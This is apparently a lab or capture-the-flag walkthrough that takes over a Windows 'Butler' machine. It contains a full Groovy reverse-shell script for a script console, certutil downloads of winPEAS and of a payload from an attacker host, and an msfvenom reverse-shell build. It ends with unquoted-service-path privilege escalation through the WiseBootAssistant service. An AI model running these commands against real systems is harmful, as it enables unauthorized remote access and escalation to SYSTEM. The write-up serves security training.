just type “groovy reverse shell” on google and you will see a github link of script copy raw and paste in the console.

and listen on the relevant port on netcat

and run the script

groovy script:

String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

we have got the shell

And after whoami we can see we are a user butler not a system

lets run the command systeminfo to see the syatem details and there is nothing interested

to escalate privlideges we are going to use winpeas

https://github.com/peass-ng/PEASS-ng/releases/tag/20251201-130af74a

and put our winpeas script in the machine by hosting a server

python3 -m http.server 80

and use this command to dump the file in butler base folder

certutil.exe -urlcache -f http://10.0.2.15/winPEASx64.exe winPEASx64.exe

After executing winpeas and looking at the enumerated data i came across this service which is unquoted and spaced out so we can attack this service.

After going to directory “c:\Program Files (x86)\Wise” we can dump the malware which we created through venom using this command
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=7777 -f exe > Wise.exe
and dumped it using this command

certutil.exe -urlcache -f http://10.0.2.15/Wise.exe Wise.exe

Now we cannot simply run the wise .exe it will run as a user which is butler

so we need to stop the service that is running and that is WisebootAssistant

sc stop WiseBootAssistant (command to stop the service)
sc query WiseBootAssistant (command to check the service is stopped or not)
sc start WiseBootAssistant (command to start the service again to get the shell of system)

And we have got the system thats it!
